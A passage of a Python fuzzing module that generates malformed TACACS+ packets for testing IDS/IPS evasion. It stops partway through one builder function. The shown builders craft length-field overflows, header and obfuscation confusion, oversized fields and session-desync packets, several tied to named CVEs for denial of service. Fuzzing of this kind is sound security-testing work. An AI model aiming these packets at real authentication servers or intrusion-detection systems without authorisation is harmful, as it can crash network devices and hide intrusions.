"""
TACACS+ protocol mutation strategies for IDS/IPS evasion fuzzing.

Grounded in:
  - RFC 8907  (TACACS+ Protocol, September 2020)
  - RFC 9887  (TACACS+ TLS 1.3, proposed)
  - CVE-2000-0486  (tac_plus length field overflow / heap corruption)
  - CVE-2014-3378  (IOS XR malformed TACACS+ packet DoS)
  - cisco-sa-20180926-tacplus  (crafted TACACS+ response DoS)
  - CVE-2025-20160  (authentication bypass without shared secret)
  - TacoTaco attack  (GreenDog / Politov, XOR-based bit-flip evasion)
  - Openwall analysis  (Solar Designer, session-ID collision / replay)
  - Cisco bug CSCvu06641  (single-connection mode multiplexing issues)
  - Scapy contrib/tacacs.py  (packet class reference)

Transport: TCP port 49.  Binary protocol with a 12-byte cleartext header
followed by an obfuscated (MD5 XOR pad) body.

Header format (12 bytes, all fields cleartext):
  major_version (4 bits) | minor_version (4 bits)
  type           (1 byte): 1=authen, 2=author, 3=acct
  seq_no         (1 byte): starts at 1, increments per packet
  flags          (1 byte): bit 0=TAC_PLUS_UNENCRYPTED_FLAG (0x01),
                            bit 2=TAC_PLUS_SINGLE_CONNECT_FLAG (0x04)
  session_id     (4 bytes): random per session
  length         (4 bytes): body length (cleartext declaration)
"""

import os
import hashlib
import random
import struct

# ── TACACS+ Constants ────────────────────────────────────────────────────────

# Version field
_VER_MAJOR_DEFAULT = 0xC       # major version = 12 (0xC)
_VER_MINOR_0 = 0x0             # minor version 0 (default)
_VER_MINOR_1 = 0x1             # minor version 1 (minor_version for authen)
_VER_DEFAULT = (_VER_MAJOR_DEFAULT << 4) | _VER_MINOR_0   # 0xC0
_VER_AUTHEN  = (_VER_MAJOR_DEFAULT << 4) | _VER_MINOR_1   # 0xC1

# Type
_TYPE_AUTHEN = 0x01
_TYPE_AUTHOR = 0x02
_TYPE_ACCT   = 0x03

# Flags
_FLAG_UNENCRYPTED    = 0x01
_FLAG_SINGLE_CONNECT = 0x04

# Authentication action
_AUTHEN_LOGIN    = 0x01
_AUTHEN_CHPASS   = 0x02
_AUTHEN_SENDAUTH = 0x04

# Authentication type
_AUTHEN_TYPE_ASCII  = 0x01
_AUTHEN_TYPE_PAP    = 0x02
_AUTHEN_TYPE_CHAP   = 0x03
_AUTHEN_TYPE_MSCHAP = 0x06

# Authentication service
_AUTHEN_SVC_NONE    = 0x00
_AUTHEN_SVC_LOGIN   = 0x01
_AUTHEN_SVC_ENABLE  = 0x02
_AUTHEN_SVC_PPP     = 0x03
_AUTHEN_SVC_PT      = 0x05
_AUTHEN_SVC_RCMD    = 0x06
_AUTHEN_SVC_X25     = 0x07
_AUTHEN_SVC_NASI    = 0x08

# Authentication status (server reply)
_AUTHEN_STATUS_PASS    = 0x01
_AUTHEN_STATUS_FAIL    = 0x02
_AUTHEN_STATUS_GETDATA = 0x03
_AUTHEN_STATUS_GETUSER = 0x04
_AUTHEN_STATUS_GETPASS = 0x05
_AUTHEN_STATUS_RESTART = 0x06
_AUTHEN_STATUS_ERROR   = 0x07
_AUTHEN_STATUS_FOLLOW  = 0x21

# Authentication continue flags
_CONTINUE_FLAG_ABORT = 0x01

# Authorization status
_AUTHOR_STATUS_PASS_ADD  = 0x01
_AUTHOR_STATUS_PASS_REPL = 0x02
_AUTHOR_STATUS_FAIL      = 0x10
_AUTHOR_STATUS_ERROR     = 0x11
_AUTHOR_STATUS_FOLLOW    = 0x21

# Accounting flags
_ACCT_FLAG_START    = 0x02
_ACCT_FLAG_STOP     = 0x04
_ACCT_FLAG_WATCHDOG = 0x08

# Accounting status
_ACCT_STATUS_SUCCESS = 0x01
_ACCT_STATUS_ERROR   = 0x02
_ACCT_STATUS_FOLLOW  = 0x21

# Privilege levels
_PRIV_LVL_MIN  = 0x00
_PRIV_LVL_USER = 0x01
_PRIV_LVL_ROOT = 0x0F
_PRIV_LVL_MAX  = 0x0F

_TACACS_PORT = 49
_MAX_PKT = 65535   # sane cap for TCP payloads

# ── Strategy metadata ────────────────────────────────────────────────────────

TACACS_STRATEGIES = [
    "header_manipulation",
    "length_field_overflow",
    "obfuscation_confusion",
    "authentication_start_fuzz",
    "authentication_continue_fuzz",
    "authorization_arg_overflow",
    "accounting_flag_confusion",
    "session_state_desync",
    "single_connection_abuse",
    "bit_flip_attack",
    "session_id_collision_replay",
    "follow_status_abuse",
    "oversized_field_bomb",
    "tcp_segmentation_evasion",
    "flow_cache_exhaustion",
    "tcp_overlap_desync",
    "segment_queue_exhaustion",
    "reassembly_policy_confusion",
    "embryonic_connection_flood",
]

TACACS_WEIGHTS = [10, 14, 8, 10, 6, 10, 6, 10, 8, 12, 8, 5, 10, 5, 6, 12, 8, 10, 6]

TACACS_STRATEGY_LABELS = {
    "header_manipulation":           "Header Manipulation",
    "length_field_overflow":         "Length Field Overflow",
    "obfuscation_confusion":         "Obfuscation Confusion",
    "authentication_start_fuzz":     "Auth Start Fuzz",
    "authentication_continue_fuzz":  "Auth Continue Fuzz",
    "authorization_arg_overflow":    "Authorization Arg Overflow",
    "accounting_flag_confusion":     "Accounting Flag Confusion",
    "session_state_desync":          "Session State Desync",
    "single_connection_abuse":       "Single-Connection Abuse",
    "bit_flip_attack":               "Bit-Flip Attack",
    "session_id_collision_replay":   "Session-ID Collision/Replay",
    "follow_status_abuse":           "FOLLOW Status Abuse",
    "oversized_field_bomb":          "Oversized Field Bomb",
    "tcp_segmentation_evasion":      "TCP Segmentation Evasion",
    "flow_cache_exhaustion":         "Flow Cache Exhaustion (Snort stream.max_flows)",
    "tcp_overlap_desync":            "TCP Overlap Desync (Ptacek-Newsham)",
    "segment_queue_exhaustion":      "Segment Queue Exhaustion (stream_tcp queue_limit)",
    "reassembly_policy_confusion":   "Reassembly Policy Confusion (BSD vs Linux)",
    "embryonic_connection_flood":    "Embryonic Connection Flood (SYN/half-open)",
}

# ── Helpers ──────────────────────────────────────────────────────────────────

def _rand_session_id():
    return random.randint(0, 0xFFFFFFFF)


def _rand_seq():
    """Client always sends odd seq_no (1, 3, 5, …)."""
    return random.choice([1, 3, 5, 7])


def _tacacs_header(version, pkt_type, seq_no, flags, session_id, body_length):
    """Build a 12-byte TACACS+ header."""
    return struct.pack("!BBBBI",
                       version, pkt_type, seq_no, flags, session_id) + \
           struct.pack("!I", body_length)


def _tacacs_packet(version, pkt_type, seq_no, flags, session_id, body):
    """Build a complete TACACS+ packet (header + body)."""
    hdr = _tacacs_header(version, pkt_type, seq_no, flags, session_id, len(body))
    return hdr + body


def _tacacs_packet_raw_length(version, pkt_type, seq_no, flags, session_id,
                              body, declared_length):
    """Build a packet with a deliberately wrong length field."""
    hdr = struct.pack("!BBBBI", version, pkt_type, seq_no, flags, session_id) + \
          struct.pack("!I", declared_length)
    return hdr + body


def _obfuscate_body(session_id, key, version, seq_no, body):
    """Apply the TACACS+ MD5 XOR pad obfuscation (RFC 8907 §4.6).

    pseudo_pad = MD5(session_id + key + version + seq_no)
                 || MD5(session_id + key + version + seq_no + pseudo_pad[0:16])
                 || …
    ciphertext = body XOR pseudo_pad[:len(body)]
    """
    if not key:
        return body  # empty key = cleartext
    sid_bytes = struct.pack("!I", session_id)
    ver_byte = struct.pack("!B", version)
    seq_byte = struct.pack("!B", seq_no)
    pad = b""
    prev = b""
    while len(pad) < len(body):
        h = hashlib.md5(sid_bytes + key + ver_byte + seq_byte + prev).digest()
        pad += h
        prev = h
    return bytes(b ^ p for b, p in zip(body, pad[:len(body)]))


def _authen_start_body(action=_AUTHEN_LOGIN, priv_lvl=_PRIV_LVL_USER,
                       authen_type=_AUTHEN_TYPE_ASCII,
                       authen_service=_AUTHEN_SVC_LOGIN,
                       user=b"admin", port=b"tty0",
                       rem_addr=b"192.168.1.100", data=b""):
    """Build an Authentication START body (RFC 8907 §5.1)."""
    user_len = len(user) & 0xFF
    port_len = len(port) & 0xFF
    rem_len = len(rem_addr) & 0xFF
    data_len = len(data) & 0xFF
    hdr = struct.pack("!BBBBBBBB",
                      action, priv_lvl, authen_type, authen_service,
                      user_len, port_len, rem_len, data_len)
    return hdr + user + port + rem_addr + data


def _authen_continue_body(user_msg=b"", data=b"", flags=0):
    """Build an Authentication CONTINUE body (RFC 8907 §5.3)."""
    return struct.pack("!HHB", len(user_msg), len(data), flags) + user_msg + data


def _author_request_body(authen_method=0x06, priv_lvl=_PRIV_LVL_USER,
                         authen_type=_AUTHEN_TYPE_ASCII,
                         authen_service=_AUTHEN_SVC_LOGIN,
                         user=b"admin", port=b"tty0",
                         rem_addr=b"192.168.1.100", args=None):
    """Build an Authorization REQUEST body (RFC 8907 §6.1)."""
    if args is None:
        args = [b"service=shell", b"cmd=show", b"cmd-arg=version"]
    arg_cnt = len(args) & 0xFF
    user_len = len(user) & 0xFF
    port_len = len(port) & 0xFF
    rem_len = len(rem_addr) & 0xFF
    hdr = struct.pack("!BBBBBBBBB",
                      authen_method, priv_lvl, authen_type, authen_service,
                      user_len, port_len, rem_len, arg_cnt, 0)
    # Remove the trailing zero and add arg lengths
    hdr = hdr[:8]  # first 8 fixed bytes
    arg_lens = bytes([len(a) & 0xFF for a in args])
    body = hdr + bytes([arg_cnt]) + arg_lens + user + port + rem_addr + b"".join(args)
    return body


def _acct_request_body(flags=_ACCT_FLAG_START, authen_method=0x06,
                       priv_lvl=_PRIV_LVL_USER,
                       authen_type=_AUTHEN_TYPE_ASCII,
                       authen_service=_AUTHEN_SVC_LOGIN,
                       user=b"admin", port=b"tty0",
                       rem_addr=b"192.168.1.100", args=None):
    """Build an Accounting REQUEST body (RFC 8907 §7.1)."""
    if args is None:
        args = [b"task_id=1", b"start_time=1700000000", b"service=shell"]
    arg_cnt = len(args) & 0xFF
    user_len = len(user) & 0xFF
    port_len = len(port) & 0xFF
    rem_len = len(rem_addr) & 0xFF
    hdr = struct.pack("!BBBBBBBBB",
                      flags, authen_method, priv_lvl, authen_type,
                      authen_service, user_len, port_len, rem_len, arg_cnt)
    arg_lens = bytes([len(a) & 0xFF for a in args])
    return hdr + arg_lens + user + port + rem_addr + b"".join(args)


def _clamp(data):
    """Clamp packet to sane TCP payload size."""
    return data[:_MAX_PKT] if len(data) > _MAX_PKT else data


# ── Strategy Builders ────────────────────────────────────────────────────────

def _build_header_manipulation():
    """Strategy 1: Mutate the 12-byte cleartext header.

    Variants:
    - invalid_major_version: major ≠ 0xC (0, 1, 0xF, 0xD, etc.)
    - invalid_minor_version: minor not 0 or 1 (2, 5, 0xF)
    - type_out_of_range: type byte 0 or 4-255
    - seq_no_zero: seq_no = 0 (invalid per RFC)
    - seq_no_even_client: even seq_no from client (server-only values)
    - reserved_flags_bits: set reserved bits in flags byte
    - session_id_boundary: session_id = 0 or 0xFFFFFFFF
    """
    variant = random.choice([
        "invalid_major_version", "invalid_minor_version", "type_out_of_range",
        "seq_no_zero", "seq_no_even_client", "reserved_flags_bits",
        "session_id_boundary",
    ])
    sid = _rand_session_id()
    body = _authen_start_body()

    if variant == "invalid_major_version":
        bad_ver = (random.choice([0, 1, 5, 0xD, 0xF]) << 4) | _VER_MINOR_0
        return _tacacs_packet(bad_ver, _TYPE_AUTHEN, 1, 0, sid, body), _TACACS_PORT
    elif variant == "invalid_minor_version":
        bad_ver = (_VER_MAJOR_DEFAULT << 4) | random.choice([2, 5, 0xA, 0xF])
        return _tacacs_packet(bad_ver, _TYPE_AUTHEN, 1, 0, sid, body), _TACACS_PORT
    elif variant == "type_out_of_range":
        bad_type = random.choice([0, 4, 5, 10, 50, 128, 200, 255])
        return _tacacs_packet(_VER_DEFAULT, bad_type, 1, 0, sid, body), _TACACS_PORT
    elif variant == "seq_no_zero":
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 0, 0, sid, body), _TACACS_PORT
    elif variant == "seq_no_even_client":
        even_seq = random.choice([2, 4, 6, 8, 254])
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, even_seq, 0, sid, body), _TACACS_PORT
    elif variant == "reserved_flags_bits":
        bad_flags = random.choice([0x02, 0x08, 0x10, 0x20, 0x40, 0x80, 0xFE, 0xFF])
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, bad_flags, sid, body), _TACACS_PORT
    else:  # session_id_boundary
        boundary_sid = random.choice([0, 0xFFFFFFFF, 1, 0x7FFFFFFF, 0x80000000])
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, boundary_sid, body), _TACACS_PORT


def _build_length_field_overflow():
    """Strategy 2: CVE-2000-0486 class — length field manipulation.

    Variants:
    - length_max_oom: length = 0xFFFFFFFF (OOM trigger)
    - length_zero_with_body: length = 0 but body present
    - length_less_than_body: length < actual body size
    - length_more_than_body: length > actual body (read-beyond-buffer)
    - integer_overflow_wrap: 12 + length wraps 32-bit
    - length_one: length = 1 with full body
    """
    variant = random.choice([
        "length_max_oom", "length_zero_with_body", "length_less_than_body",
        "length_more_than_body", "integer_overflow_wrap", "length_one",
    ])
    sid = _rand_session_id()
    body = _authen_start_body()

    if variant == "length_max_oom":
        return _tacacs_packet_raw_length(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid,
                                         body, 0xFFFFFFFF), _TACACS_PORT
    elif variant == "length_zero_with_body":
        return _tacacs_packet_raw_length(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid,
                                         body, 0), _TACACS_PORT
    elif variant == "length_less_than_body":
        short = random.randint(1, max(1, len(body) - 1))
        return _tacacs_packet_raw_length(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid,
                                         body, short), _TACACS_PORT
    elif variant == "length_more_than_body":
        over = len(body) + random.randint(100, 5000)
        return _tacacs_packet_raw_length(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid,
                                         body, over), _TACACS_PORT
    elif variant == "integer_overflow_wrap":
        # 12 + declared_length should wrap around 32-bit
        wrap_len = 0xFFFFFFFF - 11  # 12 + (0xFFFFFFF4) = 0x100000000 => wraps to 0
        return _tacacs_packet_raw_length(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid,
                                         body, wrap_len), _TACACS_PORT
    else:  # length_one
        return _tacacs_packet_raw_length(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid,
                                         body, 1), _TACACS_PORT


def _build_obfuscation_confusion(payload_override=None):
    """Strategy 3: Exploit the MD5 XOR pad obfuscation mechanism.

    Variants:
    - flag_clear_body_cleartext: UNENCRYPTED_FLAG=0 but body is cleartext
    - flag_set_body_obfuscated: UNENCRYPTED_FLAG=1 but body is obfuscated
    - wrong_key_garbage: obfuscate with wrong key → garbage after decryption
    - empty_key: obfuscate with empty key (no pad)
    - partial_obfuscation: body shorter than one MD5 block
    - double_obfuscation: obfuscate twice (encrypts then re-encrypts)
    """
    if payload_override is not None:
        sid = _rand_session_id()
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1,
                              _FLAG_UNENCRYPTED, sid, payload_override), _TACACS_PORT
    variant = random.choice([
        "flag_clear_body_cleartext", "flag_set_body_obfuscated",
        "wrong_key_garbage", "empty_key", "partial_obfuscation",
        "double_obfuscation",
    ])
    sid = _rand_session_id()
    body = _authen_start_body()
    real_key = b"shared_secret"

    if variant == "flag_clear_body_cleartext":
        # Flag says encrypted (0) but body is cleartext — parser expects obfuscated
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid, body), _TACACS_PORT
    elif variant == "flag_set_body_obfuscated":
        # Flag says unencrypted (1) but body IS obfuscated
        obf = _obfuscate_body(sid, real_key, _VER_DEFAULT, 1, body)
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED, sid, obf), _TACACS_PORT
    elif variant == "wrong_key_garbage":
        # Obfuscate with random wrong key
        wrong_key = os.urandom(random.randint(1, 32))
        obf = _obfuscate_body(sid, wrong_key, _VER_DEFAULT, 1, body)
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid, obf), _TACACS_PORT
    elif variant == "empty_key":
        # Empty key — _obfuscate_body returns cleartext
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid, body), _TACACS_PORT
    elif variant == "partial_obfuscation":
        # Very short body (less than 16 bytes)
        short_body = os.urandom(random.randint(1, 15))
        obf = _obfuscate_body(sid, real_key, _VER_DEFAULT, 1, short_body)
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid, obf), _TACACS_PORT
    else:  # double_obfuscation
        obf1 = _obfuscate_body(sid, real_key, _VER_DEFAULT, 1, body)
        obf2 = _obfuscate_body(sid, real_key, _VER_DEFAULT, 1, obf1)
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid, obf2), _TACACS_PORT


def _build_authentication_start_fuzz():
    """Strategy 4: Mutate Authentication START body fields.

    Variants:
    - invalid_action_combo: invalid action/priv_lvl/authen_type/service combos
    - lengths_exceed_body: user_len+port_len+rem_addr_len+data_len > body length
    - zero_user_pap: zero-length user with PAP (expects data)
    - authen_type_mismatch: CHAP type but no CHAP id+challenge+response structure
    - oversized_user: user string > 255 bytes (8-bit user_len wraps)
    - all_max_fields: all length fields set to 255
    """
    variant = random.choice([
        "invalid_action_combo", "lengths_exceed_body", "zero_user_pap",
        "authen_type_mismatch", "oversized_user", "all_max_fields",
    ])
    sid = _rand_session_id()

    if variant == "invalid_action_combo":
        bad_action = random.choice([0, 3, 5, 0x10, 0xFF])
        bad_priv = random.choice([0x10, 0x20, 0xFF])
        bad_type = random.choice([0, 4, 5, 0x10, 0xFF])
        bad_svc = random.choice([4, 9, 0x10, 0xFF])
        body = _authen_start_body(action=bad_action, priv_lvl=bad_priv,
                                  authen_type=bad_type, authen_service=bad_svc)
    elif variant == "lengths_exceed_body":
        # Manually craft body with length fields that sum > actual data
        hdr = struct.pack("!BBBBBBBB",
                          _AUTHEN_LOGIN, _PRIV_LVL_USER,
                          _AUTHEN_TYPE_ASCII, _AUTHEN_SVC_LOGIN,
                          200, 200, 200, 200)  # claim 800 bytes of data
        body = hdr + b"A" * 10  # only provide 10 bytes
    elif variant == "zero_user_pap":
        body = _authen_start_body(authen_type=_AUTHEN_TYPE_PAP,
                                  user=b"", data=b"")
    elif variant == "authen_type_mismatch":
        # CHAP type but provide PAP-style data (no CHAP id+challenge)
        body = _authen_start_body(authen_type=_AUTHEN_TYPE_CHAP,
                                  data=b"plaintext_password")
    elif variant == "oversized_user":
        # 8-bit user_len will wrap for > 255 byte user
        huge_user = b"A" * random.randint(256, 1000)
        hdr = struct.pack("!BBBBBBBB",
                          _AUTHEN_LOGIN, _PRIV_LVL_USER,
                          _AUTHEN_TYPE_ASCII, _AUTHEN_SVC_LOGIN,
                          len(huge_user) & 0xFF, 4, 13, 0)
        body = hdr + huge_user + b"tty0" + b"192.168.1.100"
    else:  # all_max_fields
        hdr = struct.pack("!BBBBBBBB",
                          _AUTHEN_LOGIN, _PRIV_LVL_ROOT,
                          _AUTHEN_TYPE_ASCII, _AUTHEN_SVC_LOGIN,
                          255, 255, 255, 255)
        body = hdr + os.urandom(255 * 4)

    return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                          sid, body), _TACACS_PORT


def _build_authentication_continue_fuzz():
    """Strategy 5: Mutate Authentication CONTINUE body.

    Variants:
    - oversized_user_msg: user_msg > 65535 bytes
    - abort_with_data: ABORT flag set but data present
    - even_seq_from_client: send CONTINUE with even seq_no
    - continue_before_reply: CONTINUE as first packet (no prior START)
    - lengths_exceed_body: user_msg_len + data_len > body
    - continue_nonexistent_session: CONTINUE for random session_id
    """
    variant = random.choice([
        "oversized_user_msg", "abort_with_data", "even_seq_from_client",
        "continue_before_reply", "lengths_exceed_body",
        "continue_nonexistent_session",
    ])
    sid = _rand_session_id()

    if variant == "oversized_user_msg":
        huge_msg = b"A" * random.randint(1000, 10000)
        body = _authen_continue_body(user_msg=huge_msg)
        return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 3, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "abort_with_data":
        body = _authen_continue_body(user_msg=b"aborting",
                                     data=b"reason: testing",
                                     flags=_CONTINUE_FLAG_ABORT)
        return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 3, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "even_seq_from_client":
        body = _authen_continue_body(user_msg=b"password123")
        return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 2, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "continue_before_reply":
        # seq_no = 3 implies prior exchange, but this is the first packet
        body = _authen_continue_body(user_msg=b"password123")
        return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 3, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "lengths_exceed_body":
        # Manually craft with lying length fields
        user_msg = b"short"
        data = b"data"
        raw = struct.pack("!HHB", 5000, 3000, 0) + user_msg + data
        return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 3, _FLAG_UNENCRYPTED,
                              sid, raw), _TACACS_PORT
    else:  # continue_nonexistent_session
        random_sid = random.randint(0, 0xFFFFFFFF)
        body = _authen_continue_body(user_msg=b"password123")
        return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 3, _FLAG_UNENCRYPTED,
                              random_sid, body), _TACACS_PORT


def _build_authorization_arg_overflow():
    """Strategy 6: Mutate Authorization Request arguments.

    Variants:
    - oversized_args: args with 253-byte values
    - no_separator: arg without = or * separator
    - empty_arg: zero-length argument
    - arg_cnt_mismatch: arg_cnt doesn't match actual args
    - duplicate_mandatory: service= appears twice
    - huge_arg_cnt: arg_cnt = 255 but only a few args
    """
    variant = random.choice([
        "oversized_args", "no_separator", "empty_arg",
        "arg_cnt_mismatch", "duplicate_mandatory", "huge_arg_cnt",
    ])
    sid = _rand_session_id()

    if variant == "oversized_args":
        args = [b"service=" + b"X" * 240, b"cmd=" + b"Y" * 240,
                b"cmd-arg=" + b"Z" * 240]
        body = _author_request_body(args=args)
    elif variant == "no_separator":
        args = [b"service_shell", b"cmdshow", b"cmd-argversion"]
        body = _author_request_body(args=args)
    elif variant == "empty_arg":
        args = [b"", b"", b"service=shell"]
        body = _author_request_body(args=args)
    elif variant == "arg_cnt_mismatch":
        # Build body manually with wrong arg_cnt
        args = [b"service=shell", b"cmd=show"]
        user = b"admin"
        port = b"tty0"
        rem = b"192.168.1.100"
        arg_cnt = 99  # claim 99 args but only provide 2
        hdr = struct.pack("!BBBBBBBB",
                          0x06, _PRIV_LVL_USER, _AUTHEN_TYPE_ASCII,
                          _AUTHEN_SVC_LOGIN, len(user), len(port), len(rem),
                          arg_cnt)
        arg_lens = bytes([len(a) for a in args])
        body = hdr + arg_lens + user + port + rem + b"".join(args)
    elif variant == "duplicate_mandatory":
        args = [b"service=shell", b"service=exec", b"cmd=show",
                b"cmd=configure", b"cmd-arg=terminal"]
        body = _author_request_body(args=args)
    else:  # huge_arg_cnt
        # 255 tiny args
        args = [f"arg{i}=v".encode() for i in range(255)]
        body = _author_request_body(args=args)

    return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHOR, 1, _FLAG_UNENCRYPTED,
                          sid, body), _TACACS_PORT


def _build_accounting_flag_confusion():
    """Strategy 7: Mutate Accounting Request flags.

    Variants:
    - conflicting_start_stop: START+STOP flags set simultaneously
    - conflicting_start_watchdog: START+WATCHDOG set simultaneously
    - no_flags: flags = 0 (no START/STOP/WATCHDOG)
    - all_flags: all flag bits set (0x0E)
    - watchdog_without_start: WATCHDOG without preceding START
    - wrong_packet_type: accounting args in auth packet type
    """
    variant = random.choice([
        "conflicting_start_stop", "conflicting_start_watchdog",
        "no_flags", "all_flags", "watchdog_without_start",
        "wrong_packet_type",
    ])
    sid = _rand_session_id()

    if variant == "conflicting_start_stop":
        body = _acct_request_body(flags=_ACCT_FLAG_START | _ACCT_FLAG_STOP)
    elif variant == "conflicting_start_watchdog":
        body = _acct_request_body(flags=_ACCT_FLAG_START | _ACCT_FLAG_WATCHDOG)
    elif variant == "no_flags":
        body = _acct_request_body(flags=0)
    elif variant == "all_flags":
        body = _acct_request_body(flags=0x0E)
    elif variant == "watchdog_without_start":
        body = _acct_request_body(flags=_ACCT_FLAG_WATCHDOG)
    else:  # wrong_packet_type
        body = _acct_request_body(flags=_ACCT_FLAG_START)
        # Send accounting body inside an AUTHEN type header
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT

    return _tacacs_packet(_VER_DEFAULT, _TYPE_ACCT, 1, _FLAG_UNENCRYPTED,
                          sid, body), _TACACS_PORT


def _build_session_state_desync():
    """Strategy 8: Send packets out of expected sequence.

    Variants:
    - continue_without_start: CONTINUE body without prior START
    - wrong_session_id_mid: change session_id mid-session
    - seq_no_rollover: seq_no > 255
    - type_mismatch_body: auth reply body format in authz type header
    - authz_wrong_seq: authorization request with seq_no=3
    - interleaved_types: mix auth+authz+acct on same session_id
    """
    variant = random.choice([
        "continue_without_start", "wrong_session_id_mid",
        "seq_no_rollover", "type_mismatch_body", "authz_wrong_seq",
        "interleaved_types",
    ])
    sid = _rand_session_id()

    if variant == "continue_without_start":
        body = _authen_continue_body(user_msg=b"password123")
        return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 3, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "wrong_session_id_mid":
        # Two packets: START then CONTINUE with different session_id
        pkt1 = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, _authen_start_body())
        new_sid = (sid + 1) & 0xFFFFFFFF
        pkt2 = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 3, _FLAG_UNENCRYPTED,
                              new_sid, _authen_continue_body(user_msg=b"pass"))
        return pkt1 + pkt2, _TACACS_PORT
    elif variant == "seq_no_rollover":
        body = _authen_start_body()
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 255, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "type_mismatch_body":
        # Authorization body structure in an Authentication type packet
        body = _author_request_body()
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "authz_wrong_seq":
        body = _author_request_body()
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHOR, 3, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    else:  # interleaved_types
        pkt1 = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, _authen_start_body())
        pkt2 = _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHOR, 1, _FLAG_UNENCRYPTED,
                              sid, _author_request_body())
        pkt3 = _tacacs_packet(_VER_DEFAULT, _TYPE_ACCT, 1, _FLAG_UNENCRYPTED,
                              sid, _acct_request_body())
        return pkt1 + pkt2 + pkt3, _TACACS_PORT


def _build_single_connection_abuse():
    """Strategy 9: Exploit Single Connection Mode (TAC_PLUS_SINGLE_CONNECT_FLAG).

    Variants:
    - flag_negotiation_confusion: client sets flag, ambiguous server response
    - interleaved_same_session_id: same session_id reused on multiplexed conn
    - rapid_session_churn: many sessions created/torn down rapidly
    - mixed_semantics: single-connect and per-session mixed
    - hundreds_concurrent: hundreds of concurrent session_ids
    - flag_without_support: set flag on every packet type
    """
    variant = random.choice([
        "flag_negotiation_confusion", "interleaved_same_session_id",
        "rapid_session_churn", "mixed_semantics", "hundreds_concurrent",
        "flag_without_support",
    ])

    if variant == "flag_negotiation_confusion":
        sid = _rand_session_id()
        body = _authen_start_body()
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1,
                              _FLAG_SINGLE_CONNECT | _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "interleaved_same_session_id":
        sid = _rand_session_id()
        packets = []
        for seq in [1, 3, 5, 7]:
            if seq == 1:
                body = _authen_start_body()
            else:
                body = _authen_continue_body(user_msg=f"msg_{seq}".encode())
            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, seq,
                                          _FLAG_SINGLE_CONNECT | _FLAG_UNENCRYPTED,
                                          sid, body))
        return b"".join(packets), _TACACS_PORT
    elif variant == "rapid_session_churn":
        packets = []
        for _ in range(random.randint(50, 200)):
            sid = _rand_session_id()
            body = _authen_start_body()
            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                          _FLAG_SINGLE_CONNECT | _FLAG_UNENCRYPTED,
                                          sid, body))
        return _clamp(b"".join(packets)), _TACACS_PORT
    elif variant == "mixed_semantics":
        sid = _rand_session_id()
        # First packet with SINGLE_CONNECT, second without
        pkt1 = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                              _FLAG_SINGLE_CONNECT | _FLAG_UNENCRYPTED,
                              sid, _authen_start_body())
        pkt2 = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 3,
                              _FLAG_UNENCRYPTED,
                              sid, _authen_continue_body(user_msg=b"pass"))
        return pkt1 + pkt2, _TACACS_PORT
    elif variant == "hundreds_concurrent":
        packets = []
        for i in range(random.randint(100, 500)):
            sid = i  # sequential session_ids
            body = _authen_start_body(user=f"user{i}".encode())
            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                          _FLAG_SINGLE_CONNECT | _FLAG_UNENCRYPTED,
                                          sid, body))
